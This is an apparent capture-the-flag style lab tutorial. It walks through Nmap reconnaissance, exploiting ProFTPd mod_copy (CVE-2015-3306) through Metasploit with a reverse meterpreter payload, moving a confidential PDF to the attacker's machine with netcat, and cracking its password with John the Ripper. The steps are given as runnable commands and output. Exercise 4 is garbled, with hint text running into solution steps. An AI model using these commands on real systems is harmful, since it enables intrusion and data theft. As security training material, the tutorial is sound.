## üìù Exercise 1: Network Reconnaissance with Nmap

### What is Network Reconnaissance?
**Network Reconnaissance** is the process of gathering information about a target network and its services. This is typically the first phase of any penetration test, where attackers identify live hosts, open ports, running services, and their versions. Nmap is the industry-standard tool for network discovery and security auditing.

### Question
**Scan the target network to identify live hosts and discover the FTP service. What version of ProFTPd is running and on which port?**

<details>
<summary>üí° <strong>Hint 1</strong> (Click to expand)</summary>

Start with basic network discovery:
- Use `nmap -sn <network_range>` to discover live hosts
- Common network ranges: `192.168.1.0/24`, `10.0.0.0/24`, `172.16.0.0/24`
- Once you find live hosts, scan for services on those specific IPs

Remember that FTP typically runs on port 21, but it could be on a different port.
</details>

<details>
<summary>üí° <strong>Hint 2</strong> (Click to expand)</summary>

For detailed service detection:
- Use `-sV` flag for version detection
- Use `-sC` flag for default scripts
- Use `-p-` to scan all ports or `-p 1-65535` for full range
- Use `-A` for aggressive scanning (includes version detection, script scanning, OS detection)

Example: `nmap -sV -sC -p 1-1000 <target_ip>`
</details>

<details>
<summary>üîì <strong>Solution</strong> (Click to expand)</summary>

**Network Discovery and Service Enumeration:**

1. **Host Discovery:**
   ```bash
   # Discover live hosts in your network range
   nmap -sn 192.168.1.0/24
   # or
   nmap -sn 10.0.0.0/24
   ```

2. **Service Discovery:**
   ```bash
   # Scan common ports on discovered hosts
   nmap -sV -sC -p 1-1000 <target_ip>
   
   # Or comprehensive scan
   nmap -sV -sC -A -p- <target_ip>
   ```

3. **Expected Output:**
   ```
   PORT   STATE SERVICE VERSION
   21/tcp open  ftp     ProFTPD 1.3.5b
   22/tcp open  ssh     OpenSSH 7.4
   80/tcp open  http    Apache httpd 2.4.6
   ```

4. **Key Findings:**
   - **Service**: ProFTPd FTP server
   - **Version**: 1.3.5b (vulnerable version)
   - **Port**: 21/tcp (standard FTP port)
   - **Additional services**: SSH (22), HTTP (80)

**Why this matters:** ProFTPd 1.3.5b contains a known vulnerability (CVE-2015-3306) that allows for remote code execution through file copying operations.
</details>

## üìù Exercise 2: ProFTPd Exploitation with Metasploit

### What is ProFTPd 1.3.5b Vulnerability?
**ProFTPd 1.3.5b** contains a critical vulnerability (CVE-2015-3306) in the `mod_copy` module. This vulnerability allows authenticated users to copy files anywhere on the filesystem using the SITE CPFR and SITE CPTO commands. Attackers can abuse this to write files to sensitive locations, potentially leading to remote code execution when combined with other services like SSH.

### Question
**Exploit the ProFTPd vulnerability to gain remote code execution on the target system. Use Metasploit to automate the exploitation process.**

<details>
<summary>üí° <strong>Hint 1</strong> (Click to expand)</summary>

The ProFTPd 1.3.5b vulnerability is related to the `mod_copy` module:
- Look for Metasploit modules related to ProFTPd
- The vulnerability allows file copying operations
- It can be exploited to write SSH keys to gain access

Use `search proftpd` in msfconsole to find relevant exploits.
</details>

<details>
<summary>üí° <strong>Hint 2</strong> (Click to expand)</summary>

The exploit process typically involves:
1. Using the ProFTPd file copy vulnerability to write an SSH public key
2. Copying the key to a user's authorized_keys file
3. Using the corresponding private key to SSH into the system

Key Metasploit commands:
- `use exploit/unix/ftp/proftpd_modcopy_exec`
- Set RHOSTS, RPORT, and other required options
- The exploit will handle SSH key generation and copying
</details>

<details>
<summary>üîì <strong>Solution</strong> (Click to expand)</summary>

**ProFTPd Exploitation Process:**

1. **Start Metasploit:**
   ```bash
   msfconsole
   ```

2. **Find the Exploit:**
   ```bash
   search proftpd
   # or
   search CVE-2015-3306
   ```

3. **Use the ProFTPd Exploit:**
   ```bash
   use exploit/unix/ftp/proftpd_modcopy_exec
   show info
   show options
   ```

4. **Configure the Exploit:**
   ```bash
   set RHOSTS <target_ip>
   set RPORT 21
   set TARGETURI /
   
   # Set payload (reverse shell)
   set payload linux/x86/meterpreter/reverse_tcp
   set LHOST <your_ip>
   set LPORT 4444
   
   # Show options to verify
   show options
   ```

5. **Execute the Exploit:**
   ```bash
   exploit
   # or
   run
   ```

6. **Expected Result:**
   ```
   [*] Started reverse TCP handler on <your_ip>:4444
   [*] <target_ip>:21 - Sending exploit...
   [*] <target_ip>:21 - Exploiting the mod_copy vulnerability
   [*] <target_ip>:21 - Copying SSH key to /home/user/.ssh/authorized_keys
   [*] Sending stage (984904 bytes) to <target_ip>
   [*] Meterpreter session 1 opened
   meterpreter >
   ```

7. **Verify Access:**
   ```bash
   # In meterpreter session
   sysinfo
   getuid
   pwd
   shell
   ```

**Why it works:** The exploit abuses the ProFTPd `mod_copy` vulnerability to write an SSH public key to the target's authorized_keys file, then uses the corresponding private key to establish an SSH connection, providing remote code execution capabilities.

## üìù Exercise 3: File Extraction using Netcat

### What is Netcat?
**Netcat** is a versatile networking utility that can read and write data across network connections using TCP or UDP protocols. It's often called the "Swiss Army knife" of networking tools. In penetration testing, netcat is commonly used for file transfers, creating backdoors, port scanning, and establishing reverse shells.

### Question
**Use netcat to extract an encrypted PDF file from the compromised system. The file contains sensitive information that needs to be transferred securely to your attacking machine for analysis.**

<details>
<summary>üí° <strong>Hint 1</strong> (Click to expand)</summary>

Netcat file transfer involves two steps:
1. **Receiver** (your attacking machine): Set up netcat to listen and receive the file
2. **Sender** (compromised target): Use netcat to send the file

The basic syntax:
- Receiving: `nc -l -p <port> > received_file.pdf`
- Sending: `nc <attacker_ip> <port> < file_to_send.pdf`

First, you need to locate the PDF file on the compromised system.
</details>

<details>
<summary>üí° <strong>Hint 2</strong> (Click to expand)</summary>

Steps to find and extract the PDF:
1. Search for PDF files: `find / -name "*.pdf" 2>/dev/null`
2. Look in common directories: `/home/`, `/var/`, `/tmp/`, `/opt/`
3. The file might be named something like `sensitive.pdf`, `confidential.pdf`, or `encrypted.pdf`

For the netcat transfer:
- Choose an unused port (e.g., 9999)
- Ensure the port isn't blocked by firewalls
- Start the listener first, then initiate the transfer
</details>

<details>
<summary>üîì <strong>Solution</strong> (Click to expand)</summary>

**File Discovery and Extraction Process:**

1. **Locate the Target PDF:**
   ```bash
   # In your meterpreter/shell session on the target
   find / -name "*.pdf" 2>/dev/null
   find /home -name "*sensitive*" 2>/dev/null
   find /var -name "*confidential*" 2>/dev/null
   
   # Check common locations
   ls -la /home/*/Documents/
   ls -la /var/ftp/
   ls -la /tmp/
   ```

2. **Expected Discovery:**
   ```bash
   /home/user/Documents/confidential_report.pdf
   # or
   /var/sensitive_data/encrypted_document.pdf
   ```

3. **Set Up Netcat Listener (Attacking Machine):**
   ```bash
   # On your Kali machine
   nc -l -p 9999 > extracted_document.pdf
   
   # Alternative with verbose output
   nc -lvp 9999 > extracted_document.pdf
   ```

4. **Transfer the File (Target Machine):**
   ```bash
   # From the compromised target
   nc <your_kali_ip> 9999 < /home/user/Documents/confidential_report.pdf
   
   # Or if using meterpreter
   meterpreter > shell
   nc <your_kali_ip> 9999 < /path/to/sensitive.pdf
   ```

5. **Verify Transfer:**
   ```bash
   # On your Kali machine (after transfer completes)
   ls -la extracted_document.pdf
   file extracted_document.pdf
   # Should show: PDF document, version 1.x
   ```

6. **Check PDF Protection:**
   ```bash
   # Try to open the PDF
   evince extracted_document.pdf
   # or
   pdfinfo extracted_document.pdf
   
   # If encrypted, you'll see:
   # "Command Line Error: Incorrect password"
   ```

**Why use netcat:** Netcat provides a simple, reliable method for transferring files between systems without requiring complex file-sharing protocols. It's particularly useful in penetration testing scenarios where you need to exfiltrate data quickly and quietly.

## üìù Exercise 4: PDF Password Cracking with John the Ripper

### What is John the Ripper?
**John the Ripper** is a powerful password cracking tool that supports many different password hash formats and encryption methods. The "bleeding-jumbo" branch contains additional format support, including PDF encryption. It uses various attack methods including dictionary attacks, brute force, and hybrid attacks to recover passwords.

### Question
**Crack the password of the encrypted PDF file using John the Ripper and the pdf2john.py script. What sensitive information does the decrypted document contain?**

<details>
<summary>üí° <strong>Hint 1</strong> (Click to expand)</summary>

PDF password cracking with John requires two steps:
1. **Extract the hash**: Use `pdf2john.py` to extract the password hash from the PDF
2. **Crack the hash**: Use `john` with wordlists to crack the extracted hash

The bleeding-jumbo branch of John the Ripper includes better PDF support and the pdf2john.py script.

Make sure you have the bleeding-jumbo branch installed:
```bash
git clone https://github.com/openwall/john -b bleeding-jumbo
cd john/src
./configure && make
```
</details>

<details>
<summary>üí° <strong>Hint 2</strong> (Click to expand)</summary>

Common workflow for PDF password cracking:
1. `python pdf2john.py encrypted.pdf > pdf_hash.txt`
2. `john --wordlist=rockyou.txt pdf_hash.txt`
3. `john --show pdf_hash.txt` to display cracked passwords

Popular wordlists to try:
- `/usr/share/wordlists/rockyou.txt` (most common)
- `/usr/share/wordlists/fasttrack.txt`
- Custom wordlists related to the target organization

The password might be related to the company/theme of your exercise.

   cat pdf_hash.txt
   ```

3. **Expected Hash Format:**
   ```
   extracted_document.pdf:$pdf$2*3*128*-1028*1*16*7a8b9c0d1e2f3g4h*32*a1b2c3d4e5f6g7h8*32*i9j0k1l2m3n4o5p6
   ```

4. **Prepare Wordlist:**
   ```bash
   # Use rockyou.txt (most comprehensive)
   ls -la /usr/share/wordlists/rockyou.txt
   
   # If compressed, decompress first
   gunzip /usr/share/wordlists/rockyou.txt.gz
   ```

5. **Crack the Password:**
   ```bash
   # Standard dictionary attack
   john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt
   
   # With rules for variations
   john --wordlist=/usr/share/wordlists/rockyou.txt --rules pdf_hash.txt
   
   # Monitor progress
   john --show pdf_hash.txt
   ```
